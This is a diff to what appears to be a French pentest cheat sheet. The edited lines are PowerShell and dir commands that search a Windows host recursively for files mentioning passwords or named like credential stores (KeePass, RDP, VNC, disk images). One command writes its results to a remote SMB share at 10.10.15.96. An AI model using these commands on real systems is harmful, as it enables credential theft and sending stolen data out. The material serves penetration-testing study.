@@ -155,7 +155,7 @@ dir /S /B *secret* == *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* 
 
 ```powershell
 # Terme intéressants dans des fichiers
-Get-ChildItem *.xml, *.yml, *.ini, *.txt, *.config, *.cfg, *.git, *.ps1, *.vbs, *.cmd, *.bat  -Recurse -ErrorAction SilentlyContinue | ? { $_.Path -notlike '*\windows\*' } | Select-String "password"| ft Path, LineNumber, Line -AutoSize | Tee-Object \\10.10.15.96\share\found_word_password.txt
+Get-ChildItem *.xml, *.yml, *.ini, *.txt, *.config, *.cfg, *.git, *.ps1, *.vbs, *.cmd, *.bat  -Recurse -ErrorAction SilentlyContinue | ? { $_.Path -notlike '*\windows\*' } | Select-String "password"| Select -ExpandProperty Path | Sort -Unique | Tee-Object \\10.10.15.96\share\found_word_password.txt
 
 # Fichiers avec des noms intéressants
 Get-ChildItem  -Recurse -Include "*secret*", "*pass*.txt", "*pass*.xml", "*pass*.ini", "*cred*", "*vnc*", "*.config", "*.rdp", "*.vnc", "*.cred", "*.kdbx", "*.vhd*", "*.vmdk" -ErrorAction Ignore | Select -ExpandProperty FullName
